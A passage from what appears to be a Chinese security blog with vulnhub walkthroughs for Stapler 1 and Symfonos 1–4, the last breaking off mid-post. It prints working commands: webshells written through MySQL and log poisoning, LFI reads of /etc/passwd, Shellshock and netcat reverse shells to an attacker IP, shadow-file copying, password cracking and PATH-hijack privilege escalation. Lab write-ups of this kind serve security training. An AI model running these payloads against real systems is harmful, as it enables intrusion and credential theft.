<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ftp允许匿名登录，发现文件，<code>put</code>无法写入</p>
<p><img src="/images/Stapler1/2.png" alt="2"></p>
<p>发现了潜在的用户名</p>
<p>smb枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 192.168.1.207 -R --depth 5 -P 139</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/1.png" alt="1"></p>
<p>web目录枚举<br>分别枚举80端口和12380端口，但都没有什么发现<br>可以发现，手动尝试访问12380端口的任意文件，都会返回400。所以手动尝试https访问(之前的Nmap并没有扫描出SSL信息，看来是遗漏了)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -u https:&#x2F;&#x2F;192.168.1.207:12380 -t 50 -k</span><br><span class="line"></span><br><span class="line">&#x2F;announcements&#x2F;</span><br><span class="line">&#x2F;phpmyadmin&#x2F;</span><br><span class="line">&#x2F;icons&#x2F;</span><br><span class="line">&#x2F;javascript&#x2F;</span><br><span class="line">&#x2F;server-status&#x2F;</span><br></pre></td></tr></table></figure>

<p>再运行nikto，发现了robots.txt</p>
<p><img src="/images/Stapler1/3.png" alt="3"></p>
<p>手动检查这些目录，可以发现有价值的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;blogblog&#x2F;		wordpress</span><br><span class="line">&#x2F;phpmyadmin&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接用wpscan进行扫描</p>
<p>先进行了vp扫描，但是只发现了akismet，而该插件基本都是xss<br>我们可以手动尝试枚举，或进行更详细的ap扫描</p>
<p>手动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;wp-content&#x2F;plugins&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;192.168.1.207:12380&#x2F;blogblog&#x2F;wp-content&#x2F;plugins&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/8.png" alt="8"></p>
<p>ap扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token **** --url https:&#x2F;&#x2F;192.168.1.207:12380&#x2F;blogblog&#x2F; --disable-tls-checks --enumerate ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p>这次我们发现了信息</p>
<p><img src="/images/Stapler1/4.png" alt="4"></p>
<p>直接寻找公开漏洞</p>
<p><img src="/images/Stapler1/5.png" alt="5"></p>
<p>修改exp</p>
<p><img src="/images/Stapler1/6.png" alt="6"></p>
<p>尝试运行</p>
<p><img src="/images/Stapler1/7.png" alt="7"></p>
<p>这里会遇到一个非常常见的SSL验证错误，我们可以取消证书验证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import ssl</span><br><span class="line"></span><br><span class="line">ssl._create_default_https_context &#x3D; ssl._create_unverified_context</span><br></pre></td></tr></table></figure>

<p>这样脚本运行成功，现在分析一下它的行为<br>它似乎包含了一个非常重要的文件wp-config.php，并以图片的格式进行了上传</p>
<p>我们访问<a href="https://192.168.1.207:12380/blogblog/%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E7%A1%AE%E5%AE%9E%E5%A4%9A%E4%BA%86%E5%87%A0%E7%AF%87%E6%96%87%E7%AB%A0%EF%BC%8C%E7%8E%B0%E5%9C%A8%E9%9C%80%E8%A6%81%E6%89%BE%E5%88%B0%E5%AE%83%E7%9A%84%E4%BD%8D%E7%BD%AE">https://192.168.1.207:12380/blogblog/可以发现确实多了几篇文章，现在需要找到它的位置</a><br>简单寻找，可以在<a href="https://192.168.1.207:12380/blogblog/wp-content/uploads/%E5%8F%91%E7%8E%B0%E5%AE%83%E4%BB%AC%E7%9A%84%E4%BD%8D%E7%BD%AE">https://192.168.1.207:12380/blogblog/wp-content/uploads/发现它们的位置</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -k https:&#x2F;&#x2F;192.168.1.207:12380&#x2F;blogblog&#x2F;wp-content&#x2F;uploads&#x2F;1791571933.jpeg</span><br></pre></td></tr></table></figure>

<p>我们就可以轻松读取到这些信息</p>
<p><img src="/images/Stapler1/10.png" alt="10"></p>
<p>当然也可以利用LFI读取其他文件，只要先去访问LFI漏洞页面，就会在uploads生成文件，访问即可，比如/etc/passwd</p>
<p><img src="/images/Stapler1/11.png" alt="11"></p>
<p>现在我们获得了mysql的凭据，我们可以尝试远程登录到mysql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -h 192.168.1.207 -pplbkac</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/12.png" alt="12"></p>
<h3 id="方法1wordpress后台"><a href="#方法1wordpress后台" class="headerlink" title="方法1wordpress后台"></a>方法1wordpress后台</h3><p>在获取mysql会话后，我们可以应该想到读取wordpress存储的用户凭证，在后台getshell，这是一个比较简单快捷的方式</p>
<p><img src="/images/Stapler1/13.png" alt="13"></p>
<p>将该表保存到文件<code>hash</code>中，提取第四段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F &#39;|&#39; &#39;&#123;print $4&#125;&#39; hash &gt;hash.txt</span><br></pre></td></tr></table></figure>

<p>逐个用john破解密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john password --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p>得到凭据<code>john/incorrect</code></p>
<p>后台登录安装插件</p>
<p><img src="/images/Stapler1/14.png" alt="14"></p>
<p>不知道文件插件被安装到哪里了，返回到wp-content里寻找</p>
<p><img src="/images/Stapler1/15.png" alt="15"></p>
<p>成功发现，这样就可以getshell了</p>
<p><img src="/images/Stapler1/16.png" alt="16"></p>
<h3 id="方法2mysql写shell"><a href="#方法2mysql写shell" class="headerlink" title="方法2mysql写shell"></a>方法2mysql写shell</h3><p>可以直接使用mysql的outfile尝试写webshell到常见的web目录中，看是否有运气</p>
<p>尝试直接写到web跟目录失败，权限问题<br>尝试写到uploads目录，成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot; into outfile &quot;&#x2F;var&#x2F;www&#x2F;https&#x2F;blogblog&#x2F;wp-content&#x2F;uploads&#x2F;evil.php&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/17.png" alt="17"></p>
<p>这样我们就可以获得RCE</p>
<p><img src="/images/Stapler1/18.png" alt="18"></p>
<p>可以通过它来进行反弹shell</p>
<p><img src="/images/Stapler1/19.png" alt="19"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas扫描</p>
<h3 id="方法1内核提权"><a href="#方法1内核提权" class="headerlink" title="方法1内核提权"></a>方法1内核提权</h3><p><img src="/images/Stapler1/20.png" alt="20"></p>
<p>寻找exp</p>
<p><img src="/images/Stapler1/21.png" alt="21"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.1.201&#x2F;tmp&#x2F;39772.zip</span><br><span class="line">unzip 39772.zip</span><br><span class="line">cd 39772</span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">compile.sh</span><br></pre></td></tr></table></figure>

<p>编译会产生警告，忽略它们</p>
<p><img src="/images/Stapler1/22.png" alt="22"></p>
<p>运行即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;doubleput</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/23.png" alt="23"></p>
<h3 id="方法2计划任务"><a href="#方法2计划任务" class="headerlink" title="方法2计划任务"></a>方法2计划任务</h3><p><img src="/images/Stapler1/24.png" alt="24"></p>
<p><img src="/images/Stapler1/25.png" alt="25"></p>
<p><img src="/images/Stapler1/26.png" alt="26"></p>
<p>找到了可以写入的计划任务，是个shell脚本，直接写入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;rm &#x2F;tmp&#x2F;ff;mkfifo &#x2F;tmp&#x2F;ff;cat &#x2F;tmp&#x2F;ff|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.1.201 5555 &gt;&#x2F;tmp&#x2F;ff&quot; &gt; &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;cron-logrotate.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/27.png" alt="27"></p>
<h3 id="方法3历史命令"><a href="#方法3历史命令" class="headerlink" title="方法3历史命令"></a>方法3历史命令</h3><p>寻找当前账户可以读取的.bash_history</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;home -name &quot;.bash_history&quot; -exec cat &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/28.png" alt="28"></p>
<p>发现可以切换到peter</p>
<p><img src="/images/Stapler1/29.png" alt="29"></p>
<p>而且发现，peter属于sodo组，并能sudo任何程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;bin&#x2F;bash -p</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Symfonos 1</title>
    <url>/2020/09/18/%E9%9D%B6%E5%9C%BASymfonos-1/</url>
    <content><![CDATA[<h1 id="Symfonos-1"><a href="#Symfonos-1" class="headerlink" title="Symfonos 1"></a>Symfonos 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.202</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.202 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.202 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Symfonos-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>smb枚举</p>
<p><img src="/images/Symfonos-1/2.png" alt="2"></p>
<p>发现对其中要给目录具有读权限，下载其中的文件，发现提示了我们用户的密码<br>尝试用改密码访问另一个smb目录helios</p>
<p>尝试后发现，凭据为<code>helios/qwerty</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbclient &#x2F;&#x2F;192.168.1.202&#x2F;helios -U helios</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/3.png" alt="3"></p>
<p>查看下载的文件，提示了我们一个路径</p>
<p><img src="/images/Symfonos-1/4.png" alt="4"></p>
<p>尝试访问，发现了wordpress站点</p>
<p><img src="/images/Symfonos-1/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接进行完整的插件扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxxxxx --url http:&#x2F;&#x2F;192.168.1.202&#x2F;h3l105&#x2F; -e ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p>发现了3个插件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">akismet</span><br><span class="line">mail-masta</span><br><span class="line">site-editor</span><br></pre></td></tr></table></figure>

<p>其中akismet遇到过很多次，是个比较安全的插件</p>
<p><img src="/images/Symfonos-1/6.png" alt="6"></p>
<p>寻找公开漏洞</p>
<p><img src="/images/Symfonos-1/7.png" alt="7"></p>
<p>大概有3个洞可以用，开始尝试</p>
<p><strong>mail masta的LFI</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.202&#x2F;h3l105&#x2F;wp-content&#x2F;plugins&#x2F;site-editor&#x2F;editor&#x2F;extensions&#x2F;pagebuilder&#x2F;includes&#x2F;ajax_shortcode_pattern.php?ajax_path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/8.png" alt="8"></p>
<p><strong>site editor的漏洞</strong></p>
<p>sql注入需要admin的凭证，无法直接利用</p>
<p>LFI都是可以利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;symfonos.local&#x2F;h3l105&#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;inc&#x2F;campaign&#x2F;count_of_send.php?pl&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/9.png" alt="9"></p>
<p>所以总共发现了两个LFI</p>
<p>这里的渗透过程很像<code>vulnhub Wintermute</code>对方也开启了25 Postfix smtp<br>尝试污染日志，写入shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.1.245 25</span><br><span class="line">MAIL FROM: &quot;evil &lt;?php phpinfo(); system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><br><span class="line">RCPT TO: ROOT</span><br><span class="line">data					</span><br><span class="line">evil	</span><br><span class="line">.						</span><br></pre></td></tr></table></figure>

<p>尝试包含<code>/var/mail/mail.log</code>，但是失败了，猜测文件估计是存在的，但应该有一些其他的问题<br>回到包含的/etc/passwd里，发现了普通用户helios，尝试包含它的日志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;symfonos.local&#x2F;h3l105&#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;inc&#x2F;campaign&#x2F;count_of_send.php?pl&#x3D;&#x2F;var&#x2F;mail&#x2F;helios</span><br></pre></td></tr></table></figure>

<p>这次成功了，phpshell已经写入，可以发现，虽然邮件是RCPT给ROOT的，但日志还是被写入了，估计这些服务都是运行在<code>helios</code>用户下</p>
<p>直接反弹shell，果然shell是helios不是www-data，mail.log无法包含是由于权限不足</p>
<p><img src="/images/Symfonos-1/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现了奇怪的SUID程序</p>
<p><img src="/images/Symfonos-1/11.png" alt="11"></p>
<p>nc传输到kali</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 443 &gt; statuscheck</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.1.201 443 &lt; &#x2F;opt&#x2F;statuscheck</span><br></pre></td></tr></table></figure>

<p>顺便检查一下md5</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum -b statuscheck</span><br></pre></td></tr></table></figure>

<p>没有问题后检查该文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file statuscheck </span><br><span class="line">chmod 777 statuscheck </span><br><span class="line">ltrace .&#x2F;statuscheck </span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/12.png" alt="12"></p>
<p>发现通过环境变量调用了curl，知道就好办了</p>
<p>我们在对方tmp目录下编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main ( int argc, char *argv[] )</span><br><span class="line">&#123;</span><br><span class="line">        setreuid(0,0);</span><br><span class="line">        execve(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/13.png" alt="13"></p>
<p>或者直接调用/bin/sh就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;curl</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;curl</span><br><span class="line">export PATH&#x3D;&#x2F;tmp</span><br><span class="line">&#x2F;opt&#x2F;statuscheck</span><br><span class="line"></span><br><span class="line">export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/14.png" alt="14"></p>
<p>获取root后检查之前打算包含的/var/log/mail.log，可以确认如果不是权限问题，确实可以使用</p>
<p><img src="/images/Symfonos-1/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Symfonos 2</title>
    <url>/2020/09/18/%E9%9D%B6%E5%9C%BASymfonos-2/</url>
    <content><![CDATA[<h1 id="Symfonos-2"><a href="#Symfonos-2" class="headerlink" title="Symfonos 2"></a>Symfonos 2</h1><p>kali:192.168.1.201<br>目标:192.168.1.231</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.231 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.231 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Symfonos-2/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>这里21不允许匿名登录<br>尝试枚举smb</p>
<p><img src="/images/Symfonos-2/2.png" alt="2"></p>
<p>发现了log.txt</p>
<p>首先发现它一件事，备份了/etc/shadow到/var/backups/shadow.bak<br>之后是它的smb配置</p>
<p><img src="/images/Symfonos-2/3.png" alt="3"></p>
<p>其中发现anonymous文件夹分享的位置</p>
<p><img src="/images/Symfonos-2/5.png" alt="5"></p>
<p>再往下，还有ftp的配置</p>
<p><img src="/images/Symfonos-2/4.png" alt="4"></p>
<p>发现了ftp存在的用户aeolus</p>
<p>80端口无法枚举，看来有WAF</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>考虑搜索ProFTPD的公开漏洞</p>
<p><img src="/images/Symfonos-2/6.png" alt="6"></p>
<p>文件复制那个漏洞看起来可以利用，mod_copy的RCE需要知道web的目录，这个不知道，但是可以盲猜测默认web目录</p>
<p><img src="/images/Symfonos-2/8.png" alt="8"></p>
<p>看来可能是/var/www/html不存在，要不然就是该目录无法写入，或者没有解释环境如php<br>尝试文件复制，我们已经得到了smb的分享目录，我们可以把想要复制的东西拷过去，这个漏洞利用不需要凭据，也不需要匿名登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site cpfr &#x2F;var&#x2F;backups&#x2F;shadow.bak</span><br><span class="line">site cpto &#x2F;home&#x2F;aeolus&#x2F;share&#x2F;shadow.bak</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-2/9.png" alt="9"></p>
<p>获取了shadow文件</p>
<p><img src="/images/Symfonos-2/10.png" alt="10"></p>
<p>密码可以john进行破解，可以破解出aeolus，但是cronus不能</p>
<p><img src="/images/Symfonos-2/12.png" alt="12"></p>
<p>或者根据用户名进行ftp或者ssh的破解，这里我就爆破ftp了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l aeolus -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -f ftp:&#x2F;&#x2F;192.168.1.231</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-2/7.png" alt="7"></p>
<p>得到了凭据<code>aeolus/sergioteamo</code><br>尝试ssh</p>
<p><img src="/images/Symfonos-2/11.png" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas枚举，但是没找到可以提权的点，<code>sudo -l</code>为空<br>linpeas没有枚举出本地的看房端口，检查一下发现没有netstat，我们可以用ss来检查</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ss -tnl</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-2/13.png" alt="13"></p>
<p>发现了本地开放端口8080<br>而且还发现，这似乎是由cronus运行的一个apache服务</p>
<p><img src="/images/Symfonos-2/14.png" alt="14"></p>
<p>使用ssh隧道进行本地端口转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -L 0.0.0.0:9999:127.0.0.1:8080 aeolus@192.168.1.231</span><br></pre></td></tr></table></figure>

<p>之后发现</p>
<p><img src="/images/Symfonos-2/15.png" alt="15"></p>
<p>搜索librenms漏洞</p>
<p><img src="/images/Symfonos-2/16.png" alt="16"></p>
<p>发现msf有利用模块<br>linux/http/librenms_addhost_cmd_inject需要登录凭据，我们就使用aeolus的</p>
<p><img src="/images/Symfonos-2/17.png" alt="17"></p>
<p>成功获取了cronus的shell<br>检查sudo发现了mysql</p>
<p><img src="/images/Symfonos-2/18.png" alt="18"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mysql -e &#39;\! &#x2F;bin&#x2F;sh&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-2/19.png" alt="19"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Symfonos 3</title>
    <url>/2020/09/18/%E9%9D%B6%E5%9C%BASymfonos-3/</url>
    <content><![CDATA[<h1 id="Symfonos-3"><a href="#Symfonos-3" class="headerlink" title="Symfonos 3"></a>Symfonos 3</h1><p>kali:192.168.1.201<br>目标:192.168.1.205</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.205 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.205 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Symfonos-3/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80进行目录枚举</p>
<p><img src="/images/Symfonos-3/2.png" alt="2"></p>
<p>再对gate进行枚举，没有发现</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>看来只能对cgi-bin枚举了，与cgi关联的漏洞有shellshock，尝试使用这个字典去扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;CGIs.txt</span><br></pre></td></tr></table></figure>

<p>很快被BAN，还是尝试直接枚举cgi-bin/</p>
<p><img src="/images/Symfonos-3/3.png" alt="3"></p>
<p>枚举到了一个目录，尝试访问</p>
<p><img src="/images/Symfonos-3/4.png" alt="4"></p>
<p>刷新之后会变动，看来实在运行uptime命令</p>
<p>直接给它来一发shellshock的exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -H &#39;User-Agent: () &#123; :; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&#39; http:&#x2F;&#x2F;192.168.1.205&#x2F;cgi-bin&#x2F;underworld&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-3/5.png" alt="5"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas枚举，发现了有用的Capabilities</p>
<p><img src="/images/Symfonos-3/6.png" alt="6"></p>
<p>为了确定抓取的对象，pspy进行检测</p>
<p><img src="/images/Symfonos-3/7.png" alt="7"></p>
<p>发现了ftpclient.py，我们无法查看它的内容甚至执行权限，只能查看上一级目录，可以猜测它和这个hades有关</p>
<p><img src="/images/Symfonos-3/9.png" alt="9"></p>
<p>接着开始抓包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -i any -w capture.cap -v</span><br></pre></td></tr></table></figure>

<p>传到kali里分析流量</p>
<p><img src="/images/Symfonos-3/8.png" alt="8"></p>
<p>成功发现了一些东西，hades的用户凭证，切换过去<br>之后再查看那个定时任务的权限</p>
<p><img src="/images/Symfonos-3/10.png" alt="10"></p>
<p>并不能够修改<br>linpeas再次枚举</p>
<p><img src="/images/Symfonos-3/11.png" alt="11"></p>
<p>发现了组权限可写，看到之前的ftpclient.py调用了ftplib，我们可以去查看</p>
<p><img src="/images/Symfonos-3/12.png" alt="12"></p>
<p>确实可以写，我们直接写一个反弹shell，这样执行的root就会反弹shell给我们了</p>
<p><img src="/images/Symfonos-3/13.png" alt="13"></p>
<p>打开pspy看它执行，就能获取root</p>
<p><img src="/images/Symfonos-3/14.png" alt="14"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Symfonos 4</title>
    <url>/2020/09/18/%E9%9D%B6%E5%9C%BASymfonos-4/</url>
    <content><![CDATA[<h1 id="Symfonos-4"><a href="#Symfonos-4" class="headerlink" title="Symfonos 4"></a>Symfonos 4</h1><p>kali:192.168.1.201<br>目标:192.168.1.215</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.215 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.215 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Symfonos-4/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>只有80端口，进行目录枚举，并选中php扩展名</p>
<p><img src="/images/Symfonos-4/2.png" alt="2"></p>
<p>发现了gods，里面有一些日志，但是没有有趣的信息<br>发现了atlantis.php，一个登陆页面，直接尝试sql注入</p>
<p><img src="/images/Symfonos-4/3.png" alt="3"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>直接绕过了登录</p>
<p><img src="/images/Symfonos-4/5.png" alt="5"></p>
<p>之后到了一个这样的页面，选中之后会发生一些奇怪的现象，页面的内容与gods目录下的一致，看来参数file有些问题</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>初步估计是一个LFI漏洞，并伴随<code>.log</code>扩展名<br>尝试包含/var/log/dpkg.log失败，后来发现，这个文件竟然是空的</p>
<p>想要进行日志投毒，发现之前发现的22端口，尝试投毒ssh的日志/var/log/auth.log</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh &#39;&lt;?php phpinfo();system($_GET[&#39;cmd&#39;]); ?&gt;&#39;@192.168.1.215</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-4/6.png" alt="6"></p>
<p>接着LFI包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.215&#x2F;sea.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-4/7.png" alt="7"></p>
<p>成功被解析，这样我们就能够反弹shell了</p>
<p><img src="/images/Symfonos-4/8.png" alt="8"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas扫描</p>
<p>发现了奇怪的目录</p>
<p><img src="/images/Symfonos-4/14.png" alt="14"></p>
<p>检查改目录下的文件，只有读权限</p>
<p><img src="/images/Symfonos-4/13.png" alt="13"></p>
<p>发现了root开放的端口</p>
<p><img src="/images/Symfonos-4/9.png" alt="9"></p>
<p>外部无法访问，进行远程端口转发</p>
